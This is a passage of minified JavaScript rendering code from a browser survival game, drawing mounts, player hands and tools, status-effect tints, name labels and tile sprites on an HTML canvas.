          if (this.vehicle_fx3 > 60) {
            this.vehicle_fx3 -= 60;
          }
          var t = this.vehicle_fx1 * ((this.vehicle_fx3 < 30 ? this.vehicle_fx3 / 30 : 1 - (this.vehicle_fx3 - 30) / 30) * 12 - 6);
          Ho(Ie.BABY_MAMMOTH_TAMED, i, -i.width / 4, -i.height / 4 + t);
        } else if (this.vehicle === le.MOUNT_BOAR) {
          i = sprite[Ie.BOAR_TAMED][s_.time];
          if (this.speed > 85) {
            this.vehicle_fx1 = Math.min(1, this.vehicle_fx1 + I_ / 4);
          } else {
            this.vehicle_fx1 = Math.max(0, this.vehicle_fx1 - I_);
          }
          this.vehicle_fx3 += I_ * 60;
          if (this.vehicle_fx3 > 60) {
            this.vehicle_fx3 -= 60;
          }
          t = this.vehicle_fx1 * ((this.vehicle_fx3 < 30 ? this.vehicle_fx3 / 30 : 1 - (this.vehicle_fx3 - 30) / 30) * 12 - 6);
          Ho(Ie.BOAR_TAMED, i, -i.width / 4, -i.height / 4 + t);
        } else if (this.vehicle === le.CRAB_BOSS) {
          var n = Math.PI / 2;
          var a = Math.PI / 4;
          i = sprite[Ie.CRAB_BOSS_TAMED][s_.time];
          if (this.speed > 85) {
            this.vehicle_fx1 = Math.min(1, this.vehicle_fx1 + I_ / 4);
          } else {
            this.vehicle_fx1 = Math.max(0, this.vehicle_fx1 - I_);
          }
          this.vehicle_fx3 += I_ * 60;
          if (this.vehicle_fx3 > 60) {
            this.vehicle_fx3 -= 60;
          }
          t = this.vehicle_fx1 * ((this.vehicle_fx3 < 30 ? this.vehicle_fx3 / 30 : 1 - (this.vehicle_fx3 - 30) / 30) * 12 - 6);
          Ho(Ie.CRAB_BOSS_TAMED, i, -i.width / 4 + t, -i.height / 4);
          D.restore();
          D.save();
          D.translate(__.cam.x + this.x, __.cam.y + this.y);
          D.rotate(Math.PI + this.vehicle_fx2 + a);
          D.translate(120, t);
          D.rotate(n);
          i = sprite[Ie.CRAB_BOSS_CLAW_LEFT][s_.time];
          w = -i.width;
          h = -i.height;
          Nn(D, i, -w / 2, -h / 2, w, h);
          D.restore();
          D.save();
          D.translate(__.cam.x + this.x, __.cam.y + this.y);
          D.rotate(Math.PI + this.vehicle_fx2 + n + a);
          D.translate(120, t);
          D.rotate(n);
          i = sprite[Ie.CRAB_BOSS_CLAW_RIGHT][s_.time];
          w = -i.width;
          h = -i.height;
          Nn(D, i, -w / 2, -h / 2, w, h);
        }
        D.restore();
      }
    }
    function To(e, i, t) {
      if (i.tryLoad() !== 1) {
        return i;
      }
      var r = __IMAGE_EFFECT__[t][e];
      if (r === undefined) {
        var n = (r = document.createElement("canvas")).getContext("2d");
        var a = i.width;
        var o = i.height;
        r.width = a;
        r.height = o;
        n.drawImage(i, 0, 0);
        n.globalCompositeOperation = "source-in";
        n.fillStyle = __IMAGE_EFFECT_COLOR__[t];
        n.fillRect(0, 0, a, o);
        __IMAGE_EFFECT__[t][e] = r;
      }
      return r;
    }
    function Ao() {
      var e = 0;
      switch (this.right) {
        case Ie.WOOD_SHIELD:
        case Ie.STONE_SHIELD:
        case Ie.GOLD_SHIELD:
        case Ie.DIAMOND_SHIELD:
        case Ie.AMETHYST_SHIELD:
        case Ie.REIDITE_SHIELD:
          e = 1;
      }
      if (this.ghost) {
        for (var i = 0; i < this.bubbles.length; i++) {
          var t = this.bubbles[i];
          if (t.life > 0.5) {
            var r = 1 - (t.life - 0.5) * 2;
          } else {
            r = t.life * 2;
          }
          D.globalAlpha = r;
          var n = sprite[Ie.BUBBLES][s_.time][t.id];
          Nn(D, n, __.cam.x + t.x - n.width / 2, __.cam.y + t.y - n.height / 2);
          D.globalAlpha = 1;
        }
      } else {
        D.save();
        D.translate(__.cam.x + this.x, __.cam.y + this.y);
        s_.dist_from_biomes(this);
        if (this.action & Es.ATTACK) {
          (function (e) {
            if (e.right >= 0) {
              switch (e.right) {
                case Ie.WATERING_CAN_FULL:
                  D.save();
                  var i = e.attack.v * -3 / Math.PI;
                  if (e.attack.o) {
                    var t = -Math.PI / 3 - (Math.PI / 3 + e.attack.v) / 3;
                  } else {
                    t = e.attack.v;
                  }
                  D.rotate(e.angle - Math.PI / 2 + t);
                  D.globalAlpha = i / 1.2;
                  ze(D, L * -40, L * 90, L * 5);
                  ye(D, "#0B6A84");
                  D.globalAlpha = i / 1.2;
                  ze(D, L * -52, L * 100, L * 8);
                  ye(D, "#0B6A84");
                  D.globalAlpha = i / 1.2;
                  ze(D, L * -30, L * 95, L * 4);
                  ye(D, "#0B6A84");
                  D.globalAlpha = 1;
                  D.restore();
                  break;
                case Ie.SHOVEL:
                case Ie.SHOVEL_GOLD:
                case Ie.SHOVEL_DIAMOND:
                case Ie.SHOVEL_AMETHYST:
                  if (e.fly === 1) {
                    break;
                  }
                  if (e.dist_winter > 0) {
                    var r = Ie.ICE_SHOVEL_CO[s_.time];
                  } else {
                    r = e.dist_sand > 0 || e.dist_desert > 0 ? Ie.SAND_SHOVEL_CO[s_.time] : Ie.GRD_SHOVEL_CO[s_.time];
                  }
                  i = e.attack.v * -3 / Math.PI;
                  if ((t = e.attack.o ? Math.max(0.5 - i / 2 + 0.5, 0) : Math.max(i / 2, 0)) === 0) {
                    e.angle_init = e.angle;
                  }
                  D.save();
                  D.rotate(e.angle_init - Math.PI / 2);
                  D.globalAlpha = i;
                  var n = L * 25 + t * 25;
                  ze(D, n, L * 80, L * 15);
                  ye(D, r);
                  ze(D, -n, L * 80, L * 15);
                  ye(D, r);
                  D.globalAlpha = 1;
                  D.restore();
              }
            }
          })(this);
        }
        D.save();
        D.rotate(this.angle - Math.PI / 2);
        if (!(this.action & Es.ATTACK)) {
          if (this.action & Es.IDLE || this.vehicle !== 0) {
            this.idle.update();
          } else if (this.action & Es.WALK) {
            this.walk.update();
          }
        }
        var a;
        var o = this.idle.v;
        var s = this.walk.v;
        if (this.clothe === Ie.WINTER_HOOD) {
          n = sprite[Ie.GLOVES_HOOD][s_.time];
          a = Ie.GLOVES_HOOD;
        } else if (this.clothe === Ie.DIAMOND_PROTECTION) {
          n = sprite[Ie.GLOVES_DIAMOND_PROTECTION][s_.time];
          a = Ie.GLOVES_DIAMOND_PROTECTION;
        } else if (this.clothe === Ie.AMETHYST_PROTECTION) {
          n = sprite[Ie.GLOVES_AMETHYST_PROTECTION][s_.time];
          a = Ie.GLOVES_AMETHYST_PROTECTION;
        } else if (this.clothe === Ie.REIDITE_PROTECTION) {
          n = sprite[Ie.GLOVES_REIDITE_PROTECTION][s_.time];
          a = Ie.GLOVES_REIDITE_PROTECTION;
        } else if (this.superzombie) {
          n = sprite[Ie.ZOMBIE_HAND][s_.time];
          a = Ie.ZOMBIE_HAND;
        } else {
          n = sprite[Ie.HAND][this.skin][s_.time];
          a = Ie.HAND;
        }
        shadow = sprite[Ie.HAND_SHADOW][s_.time];
        var _ = n;
        var E = a;
        if (this.action & Es.ATTACK) {
          if (this.attack.update() && this.attack.o == 0) {
            this.hand = !this.hand;
            this.action -= Es.ATTACK;
            if (this.uid == __.uid) {
              __.control.mouse = 0;
            }
          }
          if (this.right >= 0) {
            this.hand = true;
          }
          var T = this.hand ? this.attack.v : -this.attack.v / 3;
          var A = this.hand ? this.attack.v / 3 : -this.attack.v;
          if (this.superzombie) {
            D.save();
            D.rotate(T);
            Go(a, n, -n.width / 2 - L * (66 + o), -n.height / 2 + (5 + s) * L);
            D.restore();
            D.save();
            D.rotate(A);
            Go(a, n, -n.width / 2 + L * (66 + o), -n.height / 2 + (5 + s) * L);
            D.restore();
          } else if (e === 0) {
            if (this.right === Ie.WOOD_BOW) {
              T = -Utils.ease_out_quad(-T);
            }
            D.save();
            D.rotate(T);
            Go(Ie.HAND_SHADOW, shadow, -shadow.width / 2 - L * (49 + o), -shadow.height / 2 + (15 + s) * L);
            if (this.right === Ie.BOOK) {
              var d = sprite[this.right][this.book][s_.time];
              fo(this.right, this.book, d, -d.width / 4 - L * (62 + o), -d.height / 4 + L * (s + 18));
            } else {
              so(this.right, o, s);
            }
            if (a >= Ie.GLOVES_DIAMOND_PROTECTION) {
              Ho(a, n, -n.width / 4 - L * (49 + o), -n.height / 4 + (11 + s) * L);
            } else if (a !== Ie.GLOVES_HOOD) {
              fo(a, this.skin, n, -n.width / 4 - L * (49 + o), -n.height / 4 + (11 + s) * L);
            } else {
              Go(a, n, -n.width / 2 - L * (49 + o), -n.height / 2 + (11 + s) * L);
            }
            D.restore();
            D.save();
            D.rotate(A);
            Go(Ie.HAND_SHADOW, shadow, -shadow.width / 2 + L * (49 + o), -shadow.height / 2 + (15 + s) * L);
            if (a >= Ie.GLOVES_DIAMOND_PROTECTION) {
              Ho(a, n, -n.width / 4 + L * (49 + o), -n.height / 4 + (11 + s) * L);
            } else if (a !== Ie.GLOVES_HOOD) {
              fo(a, this.skin, n, -n.width / 4 + L * (49 + o), -n.height / 4 + (11 + s) * L);
            } else {
              Go(a, n, -n.width / 2 + L * (49 + o), -n.height / 2 + (11 + s) * L);
            }
            D.restore();
          }
        } else if (this.superzombie) {
          Go(a, n, -n.width / 2 - L * (66 + o), -n.height / 2 + (5 + s) * L);
          Go(a, n, -n.width / 2 + L * (66 + o), -n.height / 2 + (5 + s) * L);
        } else if (e === 0) {
          Go(Ie.HAND_SHADOW, shadow, -shadow.width / 2 - L * (49 + o), -shadow.height / 2 + (15 + s) * L);
          if (this.right === Ie.BOOK) {
            d = sprite[this.right][this.book][s_.time];
            fo(this.right, this.book, d, -d.width / 4 - L * (62 + o), -d.height / 4 + L * (s + 18));
          } else {
            so(this.right, o, s);
          }
          if (a >= Ie.GLOVES_DIAMOND_PROTECTION) {
            Ho(a, n, -n.width / 4 - L * (49 + o), -n.height / 4 + (11 + s) * L);
          } else if (a !== Ie.GLOVES_HOOD) {
            fo(a, this.skin, n, -n.width / 4 - L * (49 + o), -n.height / 4 + (11 + s) * L);
          } else {
            Go(a, n, -n.width / 2 - L * (49 + o), -n.height / 2 + (11 + s) * L);
          }
          Go(Ie.HAND_SHADOW, shadow, -shadow.width / 2 + L * (49 + o), -shadow.height / 2 + (15 + s) * L);
          if (a >= Ie.GLOVES_DIAMOND_PROTECTION) {
            Ho(a, n, -n.width / 4 + L * (49 + o), -n.height / 4 + (11 + s) * L);
          } else if (a !== Ie.GLOVES_HOOD) {
            fo(a, this.skin, n, -n.width / 4 + L * (49 + o), -n.height / 4 + (11 + s) * L);
          } else {
            Go(a, n, -n.width / 2 + L * (49 + o), -n.height / 2 + (11 + s) * L);
          }
        }
        if (this.bag && this.clothe < 1) {
          n = sprite[Ie.BAG][this.baglook][s_.time];
          fo(Ie.BAG, this.baglook, n, -n.width / 4, -n.height / 4 - L * 39);
        }
        if (this.superzombie) {
          n = sprite[Ie.ZOMBIE_BODY][s_.time];
          Go(Ie.ZOMBIE_BODY, n, -n.width / 2, -n.height / 2);
          this.move_head.update();
          n = sprite[Ie.ZOMBIE_HEAD][s_.time];
          Go(Ie.ZOMBIE_HEAD, n, -n.width / 2, -n.height / 2 + this.move_head.v);
        } else {
          n = sprite[Ie.BODY][this.skin][s_.time];
          if (this.clothe !== Ie.WINTER_HOOD && (fo(Ie.BODY, this.skin, n, -n.width / 4, -n.height / 4), this.accessory > 0)) {
            n = sprite[Ie.ACCESSORY][this.accessory][s_.time];
            fo(Ie.ACCESSORY, this.accessory, n, -n.width / 4, -n.height / 4);
          }
        }
        if (this.action & Es.HEAL) {
          if (this.heal.update() && this.heal.o == 0) {
            this.action -= Es.HEAL;
          }
          D.globalAlpha = 0.6 - this.heal.v;
          if (this.superzombie) {
            n = sprite[Ie.ZOMBIE_HEAL];
            Nn(D, n, -n.width / 2, -n.height / 2);
          } else {
            n = To(this.skin, sprite[Ie.BODY][this.skin][0], __EFFECT_HEAL__);
            Nn(D, n, n.width / 4, n.height / 4, -n.width / 2, -n.height / 2);
          }
          D.globalAlpha = 1;
        }
        if (this.action & Es.WEB) {
          if (this.web.update() && this.web.o == 0) {
            this.action -= Es.WEB;
          }
          D.globalAlpha = 0.6 - this.web.v;
          n = sprite[Ie.WEB];
          Nn(D, n, -n.width / 2, -n.height / 2);
          D.globalAlpha = 1;
        }
        if (this.action & Es.HURT) {
          if (this.hit.update() && this.hit.o == 0) {
            this.action -= Es.HURT;
          }
          D.globalAlpha = 0.6 - this.hit.v;
          if (this.superzombie) {
            n = sprite[Ie.ZOMBIE_HURT];
            Nn(D, n, -n.width / 2, -n.height / 2);
          } else {
            n = To(this.skin, sprite[Ie.BODY][this.skin][0], __EFFECT_HURT__);
            Nn(D, n, n.width / 4, n.height / 4, -n.width / 2, -n.height / 2);
          }
          D.globalAlpha = 1;
        }
        if (this.action & Es.COLD) {
          if (this.freeze.update() && this.freeze.o == 0) {
            this.action -= Es.COLD;
          }
          D.globalAlpha = 0.6 - this.freeze.v;
          n = To(this.skin, sprite[Ie.BODY][this.skin][0], __EFFECT_COLD__);
          Nn(D, n, n.width / 4, n.height / 4, -n.width / 2, -n.height / 2);
          D.globalAlpha = 1;
        }
        if (this.action & Es.HUNGER) {
          if (this.starve.update() && this.starve.o == 0) {
            this.action -= Es.HUNGER;
          }
          D.globalAlpha = 0.6 - this.starve.v;
          if (this.superzombie) {
            n = sprite[Ie.ZOMBIE_HUNGER];
            Nn(D, n, -n.width / 2, -n.height / 2);
          } else {
            n = To(this.skin, sprite[Ie.BODY][this.skin][0], __EFFECT_HUNGER__);
            Nn(D, n, n.width / 4, n.height / 4, -n.width / 2, -n.height / 2);
          }
          D.globalAlpha = 1;
        }
        _o(this.clothe);
        if (e === 1) {
          if (this.action & Es.ATTACK) {
            o += this.attack.v * 15;
          }
          Go(Ie.HAND_SHADOW, shadow, -shadow.width / 2 - L * 26, -shadow.height / 2 + (31 + s + o) * L);
          if (E >= Ie.GLOVES_DIAMOND_PROTECTION) {
            Ho(E, _, -_.width / 4 - L * 26, -_.height / 4 + (27 + s + o) * L);
          } else if (E !== Ie.GLOVES_HOOD) {
            fo(E, this.skin, _, -_.width / 4 - L * 26, -_.height / 4 + (27 + s + o) * L);
          } else {
            Go(E, _, -_.width / 2 - L * 26, -_.height / 2 + (27 + s + o) * L);
          }
          Go(Ie.HAND_SHADOW, shadow, -shadow.width / 2 + L * 26, -shadow.height / 2 + (31 + s + o) * L);
          if (E >= Ie.GLOVES_DIAMOND_PROTECTION) {
            Ho(E, _, -_.width / 4 + L * 26, -_.height / 4 + (27 + s + o) * L);
          } else if (E !== Ie.GLOVES_HOOD) {
            fo(E, this.skin, _, -_.width / 4 + L * 26, -_.height / 4 + (27 + s + o) * L);
          } else {
            Go(E, _, -_.width / 2 + L * 26, -_.height / 2 + (27 + s + o) * L);
          }
          oo(this.right, 0, s + o);
        }
        D.restore();
        if (this.dist_winter > 0) {
          if (!this.player.label_winter) {
            this.player.label_winter = Zi(L, this.player.nickname, 20, "#187484", "#000", 2, null, null, L * 300);
          }
          n = this.player.label_winter;
        } else {
          if (!this.player.label) {
            this.player.label = Zi(L, this.player.nickname, 20, "#FFF", "#000", 2, null, null, L * 300);
          }
          n = this.player.label;
        }
        if (s_.day == Ie.NIGHT) {
          D.globalAlpha = 0.5;
        }
        o = Math.floor(-n.width / 2);
        s = Math.floor(-n.height / 2 - L * 70);
        Nn(D, n, o, s);
        if (this.player.level > 0) {
          var h = o + n.width + 5;
          n = sprite[Ie.VERIFIED];
          if (PLAYER_LEVEL[this.player.level] === undefined) {
            PLAYER_LEVEL[this.player.level] = Zi(L, "[" + this.player.level + "]", 20, "#F9E8A2", "#000", 2, null, null, L * 50);
          }
          Nn(D, PLAYER_LEVEL[this.player.level], h, s);
        }
        D.globalAlpha = 1;
        if (__.in_team(this.pid)) {
          if (this.pid == __.team[0]) {
            n = sprite[Ie.ICON_LEADER];
          } else {
            n = sprite[Ie.ICON_MEMBER];
          }
          Nn(D, n, o - n.width - 5, s - 6);
        }
        D.restore();
      }
    }
    function ho() {
      if (this.enabled && this.delay >= 0) {
        var e = new Date().getTime() - this.delay;
        var i = e % 1000 / 1000;
        if (i > 0.5) {
          i = 1 - (i - 0.5) * 2;
        } else {
          i *= 2;
        }
        if ((e = Math.floor(e / 1000)) < ds.GHOST_DELAY) {
          e = ds.GHOST_DELAY - e;
          if (!this.label) {
            this.label = Zi(L, " seconds before you die", 40, "#660000", null, null, null, null, null, "#000", 10);
          }
          if (!(this.now == e && this.sec)) {
            this.now = e;
            this.sec = Zi(L, "" + e, 40, "#660000", null, null, null, null, null, "#000", 10);
          }
          Nn(D, this.label, (S - this.label.width) / 2, L * 100);
          D.globalAlpha = i;
          Nn(D, this.sec, (S - this.label.width) / 2 - this.sec.width + L * 15, L * 100);
          D.globalAlpha = 1;
        }
      }
    }
    function Io() {
      if (this.message !== undefined) {
        var e = __.inv.can_select.length > 0 ? -95 : 0;
        Nn(D, this.message, 0, p - this.message.height + e);
      }
    }
    function uo(e, i) {
      if (this.text) {
        if (this.timeout.o) {
          D.globalAlpha = 1 - this.timeout.v;
        } else {
          D.globalAlpha = 1;
        }
        if (!this.label) {
          this.label = Zi(L, this.text, 40, e, null, null, null, null, null, i, 10);
        }
        Nn(D, this.label, (S - this.label.width) / 2, L * 50);
        D.globalAlpha = 1;
        if (this.timeout.update() && this.timeout.o == 0) {
          this.text = this.list.shift();
          this.label = null;
        }
      }
    }
    function lo() {
      D.save();
      D.translate(__.cam.x + this.x, __.cam.y + this.y);
      if (this.text.length > 0) {
        for (var e = 0; e < this.text.length && e < 2; e++) {
          if (!this.label[e]) {
            this.label[e] = Ke(L, this.text[e]);
            this.text_effect[e] = 0;
            this.text_move[e] = 0;
          }
          if (e === 1) {
            this.text_move[0] = Utils.ease_in_out_quad(this.text_ease) * 30;
          }
        }
        this.text_effect[0] += I_;
        if (this.text.length > 1) {
          this.text_ease = Math.min(this.text_ease + I_, 1);
          if (this.text_effect[0] > 1 && this.text_ease > 0.5) {
            this.text_effect[1] += I_;
          }
        }
        for (e = 0; e < this.text.length && e < 2; e++) {
          var i = this.text_effect[e];
          if (i > 0) {
            D.globalAlpha = i < 0.25 ? i * 4 : i > 3.75 ? Math.max((4 - i) * 4, 0) : 1;
            Nn(D, this.label[e], -this.label[e].width / 2, -this.text_move[e] + -this.label[e].height / 2 - L * 110);
          }
        }
        if (this.text_effect[0] > 4) {
          this.text_effect.shift();
          this.text.shift();
          this.text_move.shift();
          this.label.shift();
          this.text_ease = 0;
        }
      }
      D.restore();
    }
    __EFFECT_HURT__ = 0;
    __EFFECT_HEAL__ = 1;
    __EFFECT_COLD__ = 2;
    __EFFECT_HUNGER__ = 3;
    __EFFECT_BOX__ = 4;
    __IMAGE_EFFECT__ = [[], [], [], [], []];
    __IMAGE_EFFECT_COLOR__ = ["#BB0000", "#00BB00", "#1CE7E0", "#DBE71C", "#BB0000"];
    var Oo = 0;
    function co(e, i, t, r, n, a, o, s) {
      if (s === undefined) {
        s = 0;
      }
      for (var _ = o; _ >= s; _--) {
        for (var E = e; E <= i; E++) {
          for (var T = t; T <= r; T++) {
            var A = a_.tiles[E][T];
            if (A && A[a]) {
              var d = A[a][_];
              if (d !== undefined) {
                for (var h = 0; h < d.length; h++) {
                  var I = d[h];
                  var u = sprite[n][s_.time][_];
                  var l = (Oo + (E + T) * 3) % 60;
                  var O = l < 30 ? l / 30 : 1 - (l - 30) / 30;
                  var c = -u.width * (1 + O * 0.9 / 30);
                  var R = -u.height * (1 + O * 0.9 / 30);
                  O = (l = (Oo + (E + T) * 7) % 60) < 30 ? l / 30 : 1 - (l - 30) / 30;
                  var g = D.globalAlpha;
                  D.globalAlpha = (0.9 + O * 0.1) * g;
                  Nn(D, u, __.cam.x + I.x - c / 2, __.cam.y + I.y - R / 2, c, R);
                  D.globalAlpha = g;
                }
              }
            }
          }
        }
      }
    }
    function Ro(e, i, t, r, n, a, o, s) {
      if (s === undefined) {
        s = 0;
      }
      s_.breath[n].update();
      for (var _ = o; _ >= s; _--) {
        for (var E = e; E <= i; E++) {
          for (var T = t; T <= r; T++) {
            var A = a_.tiles[E][T];
            if (A && A[a]) {
              var d = A[a][_];
              if (d !== undefined) {
                for (var h = 0; h < d.length; h++) {
                  var I = d[h];
                  if (I.update) {
                    if (I.hit.update() && I.hit.o == 0) {
                      I.update = false;
                    }
                    var u = (1 - I.hit.v) * I_ * 600 * L;
                    var l = Math.cos(I.angle) * u;
                    var O = Math.sin(I.angle) * u;
                  } else {
                    l = 0;
                    O = 0;
                  }
                  var c = sprite[n][s_.time][_];
                  var R = -c.width * s_.breath[n].v;
                  var g = -c.height * s_.breath[n].v;
                  Nn(D, c, __.cam.x + I.x - R / 2 + l, __.cam.y + I.y - g / 2 + O, R, g);
                }
              }
            }
          }
        }
      }
    }
    var go = [];
    for (Me = 0; Me < 100; Me++) {
      var Co = 1;
      if (Math.random() < 0.25) {
        Co = 0;
      }
      go.push(Co);
    }
    function No(e, i, t, r, n, a, o, s, _) {
      if (s === undefined) {
        s = 0;
      }
      for (var E = o; E >= s; E--) {
        for (var T = e; T <= i; T++) {
          for (var A = t; A <= r; A++) {
            if (!(_ > 0 && go[(T + A * _) % go.length] === 1)) {
              var d = a_.tiles[T][A];
              if (d !== undefined && d[a] !== undefined) {
                var h = d[a][E];
                if (h !== undefined) {
                  for (var I = 0; I < h.length; I++) {
                    var u = h[I];
                    if (u.update) {
                      if (u.hit.update() && u.hit.o == 0) {
                        u.update = false;
                      }
                      var l = (1 - u.hit.v) * I_ * 600 * L;
                      var O = Math.cos(u.angle) * l;
                      var c = Math.sin(u.angle) * l;
                    } else {
                      O = 0;
                      c = 0;
                    }
                    var R = sprite[n][s_.time][E];
                    Nn(D, R, __.cam.x + u.x - R.width / (_scale_object * 2) + O, __.cam.y + u.y - R.height / (_scale_object * 2) + c, R.width / _scale_object, R.height / _scale_object);
                  }
                }
              }
            }
          }
        }
      }
    }
    function bo(e, i, t, r, n, a, o, s, _) {
      if (s === undefined) {
        s = 0;
      }
      for (var E = e; E <= i; E++) {
        for (var T = t; T <= r; T++) {
          var A = a_.tiles[E][T];
          if (A !== undefined && A[a] !== undefined) {
            var d = A[a];
            if (d !== undefined) {
              if (d.scale === 1) {
                var h = sprite[n][s_.time][d._id];
                D.save();
                D.translate(__.cam.x + d.x, __.cam.y + d.y);
                D.rotate(d.angle);
                Nn(D, h, -h.width / 4, -h.height / 4, h.width / 2, h.height / 2);
                D.restore();
              } else if (d.scale === 3) {
                for (var I = 0; I < d.p.length; I++) {
                  D.save();
                  D.translate(__.cam.x + d.x, __.cam.y + d.y);
                  D.rotate(d.p[I].angle);
                  h = sprite[n][s_.time][d.p[I]._id];
                  Nn(D, h, -h.width / 3 + d.p[I].x, -h.height / 3 + d.p[I].y, h.width / 1.5, h.height / 1.5);
                  D.restore();
                }
              } else {
                h = sprite[n][s_.time][d._id];
                D.save();
                D.translate(__.cam.x + d.x, __.cam.y + d.y);
                D.rotate(d.angle);
                Nn(D, h, -h.width / 2, -h.height / 2, h.width, h.height);
                D.restore();
              }
            }
          }
        }
      }
    }
    function Do(e, i, t, r, n, a, o, s, _) {
      if (s === undefined) {
        s = 0;
      }
      for (var E = o; E >= s; E--) {
        for (var T = e; T <= i; T++) {
          for (var A = t; A <= r; A++) {
            var d = a_.tiles[T][A];
            if (d !== undefined && d[a] !== undefined) {
              var h = d[a][E];
              if (h !== undefined) {
                for (var I = 0; I < h.length; I++) {
                  var u = h[I];
                  if (u.update) {
                    if (u.hit.update() && u.hit.o == 0) {
                      u.update = false;
                    }
                    var l = (1 - u.hit.v) * I_ * 600 * L;
                    var O = Math.cos(u.angle) * l;
                    var c = Math.sin(u.angle) * l;
                  } else {
                    O = 0;
                    c = 0;
                  }
                  for (var R = 0; R < _bubble[E].amount; R++) {
                    if (s_.lava[R].last !== u_) {
                      s_.lava[R].update();
                      s_.lava[R].last = u_;
                    }
                    var g = sprite[Ie.LAVA_BUBBLE][s_.time][_bubble[E].pos[R].t];
                    var C = -g.width * s_.lava[R].v;
                    var N = -g.height * s_.lava[R].v;
                    Nn(D, g, __.cam.x + u.x - C / 4 + O + _bubble[E].pos[R].x, __.cam.y + u.y - N / 4 + c + _bubble[E].pos[R].y, C / 2, N / 2);
                  }
                }
              }
            }
          }
        }
      }
    }
    _scale_object = 1;
    _bubble = [{
      amount: 10,
      pos: [{
        x: -128,
        y: -20,
        t: 0
      }, {
        x: -86,
        y: -4,
        t: 1
      }, {
        x: -60,
        y: -74,
        t: 2
      }, {
        x: -22,
        y: -144,
        t: 0
      }, {
        x: -58,
        y: 86,
        t: 0
      }, {
        x: 3,
        y: -30,
        t: 0
      }, {
        x: 65,
        y: -115,
        t: 1
      }, {
        x: 118,
        y: -50,
        t: 0
      }, {
        x: 73,
        y: 15,
        t: 1
      }, {
        x: 67,
        y: 79,
        t: 0
      }]
    }, {
      amount: 5,
      pos: [{
        x: -45,
        y: -26,
        t: 0
      }, {
        x: -45,
        y: 20,
        t: 2
      }, {
        x: 10,
        y: -60,
        t: 1
      }, {
        x: 52,
        y: -17,
        t: 1
      }, {
        x: 14,
        y: 45,
        t: 0
      }]
    }, {
      amount: 3,
      pos: [{
        x: -30,
        y: 3,
        t: 2
      }, {
        x: 7,
        y: -38,
        t: 2
      }, {
        x: 37,
        y: 5,
        t: 2
      }]
    }, {
      amount: 11,
      pos: [{
        x: -74,
        y: -87,
        t: 2
      }, {
        x: -11,
        y: -10,
        t: 1
      }, {
        x: -99,
        y: 17,
        t: 1
      }, {
        x: -66,
        y: 84,
        t: 0
      }, {
        x: -55,
        y: 123,
        t: 1
      }, {
        x: 10,
        y: 81,
        t: 2
      }, {
        x: 52,
        y: 50,
        t: 0
      }, {
        x: 138,
        y: 9,
        t: 1
      }, {
        x: 104,
        y: -28,
        t: 0
      }, {
        x: 67,
        y: -56,
        t: 2
      }, {
        x: 5,
        y: -112,
        t: 0
      }]
    }, {
      amount: 6,
      pos: [{
        x: -33,
        y: -66,
        t: 2
      }, {
        x: -58,
        y: 10,
        t: 0
      }, {
        x: -19,
        y: 44,
        t: 1
      }, {
        x: 44,
        y: 20,
        t: 0
      }, {
        x: 53,
        y: -36,
        t: 2
      }, {
        x: 7,
        y: -62,
        t: 0
      }]
    }, {
      amount: 3,
      pos: [{
        x: -19,
        y: -25,
        t: 1
      }, {
        x: -29,
        y: 13,
        t: 2
      }, {
        x: 12,
        y: 12,
        t: 0
      }]
    }];
    var So = 0;
    var po = 0;
    var mo = 0;
    var vo = 0;
    function Mo(e, i) {
      if (s_.transition) {
        D.globalAlpha = 1;
        e.draw_bg(i);
        s_.time = s_.time ? 0 : 1;
        D.globalAlpha = 1 - s_.shade.v;
        e.draw_bg(i);
        s_.time = s_.time ? 0 : 1;
        D.globalAlpha = 1;
      } else {
        e.draw_bg(i);
      }
    }
    function Lo(e, i) {
      if (s_.transition) {
        D.globalAlpha = 1;
        e.draw_fg(i);
        s_.time = s_.time ? 0 : 1;
        D.globalAlpha = 1 - s_.shade.v;
        e.draw_fg(i);
        s_.time = s_.time ? 0 : 1;
        D.globalAlpha = 1;
      } else {
        e.draw_fg(i);
      }
    }
    function Go(e, i, t, r) {
      if (s_.transition) {
        D.globalAlpha = 1;
        Nn(D, sprite[e][s_.time], t, r);
        s_.time = s_.time ? 0 : 1;
        D.globalAlpha = 1 - s_.shade.v;
        Nn(D, sprite[e][s_.time], t, r);
        s_.time = s_.time ? 0 : 1;
        D.globalAlpha = 1;
      } else {
        Nn(D, i, t, r);
      }
    }
    function fo(e, i, t, r, n) {
      var a = t.width;
      var o = t.height;
      var s = Math.floor(a / 2);
      var _ = Math.floor(o / 2);
      if (s_.transition) {
        D.globalAlpha = 1;
        Nn(D, sprite[e][i][s_.time], 0, 0, a, o, r, n, s, _);
        s_.time = s_.time ? 0 : 1;
        D.globalAlpha = 1 - s_.shade.v;
        Nn(D, sprite[e][i][s_.time], 0, 0, a, o, r, n, s, _);
        s_.time = s_.time ? 0 : 1;
        D.globalAlpha = 1;
      } else {
        Nn(D, sprite[e][i][s_.time], 0, 0, a, o, r, n, s, _);
      }
    }
    function Ho(e, i, t, r) {
      var n = i.width;
      var a = i.height;
      var o = Math.floor(n / 2);
      var s = Math.floor(a / 2);
      if (s_.transition) {
        D.globalAlpha = 1;
        Nn(D, sprite[e][s_.time], 0, 0, n, a, t, r, o, s);
        s_.time = s_.time ? 0 : 1;
        D.globalAlpha = 1 - s_.shade.v;
        Nn(D, sprite[e][s_.time], 0, 0, n, a, t, r, o, s);
        s_.time = s_.time ? 0 : 1;
        D.globalAlpha = 1;
      } else {
        Nn(D, i, 0, 0, n, a, t, r, o, s);
      }
    }
    function Po(e) {
      D.globalAlpha = e.alpha;
      ze(D, e.x + __.cam.x, e.y + __.cam.y, e.r);
      ye(D, Ie.SWIM_COLOR[s_.time]);
      D.globalAlpha = 1;
    }
    function yo(e) {
      D.save();
      D.translate(__.cam.x + e.x, __.cam.y + e.y);
      D.rotate(e.angle);
      D.globalAlpha = e.alpha;
      var i = sprite[e.id][s_.time];
      Nn(D, i, -i.width / 2, -i.height / 2);
      D.globalAlpha = 1;
      D.restore();
    }
    function Bo(e, i, t, r, n) {
      if (s_.transition && n == 1) {
        D.globalAlpha = 1;
        Nn(D, sprite[e][s_.time][i], t, r);
        s_.time = s_.time ? 0 : 1;
        D.globalAlpha = 1 - s_.shade.v;
        Nn(D, sprite[e][s_.time][i], t, r);
        s_.time = s_.time ? 0 : 1;
        D.globalAlpha = 1;
      } else {
        D.globalAlpha = n;
        Nn(D, sprite[e][s_.time][i], t, r);
        D.globalAlpha = 1;
      }
    }
    function zo(e, i, t) {
      if (s_.transition) {
        D.globalAlpha = 1;
        e.draw(i, t);
        s_.time = s_.time ? 0 : 1;
        D.globalAlpha = 1 - s_.shade.v;
        e.draw(i, t);
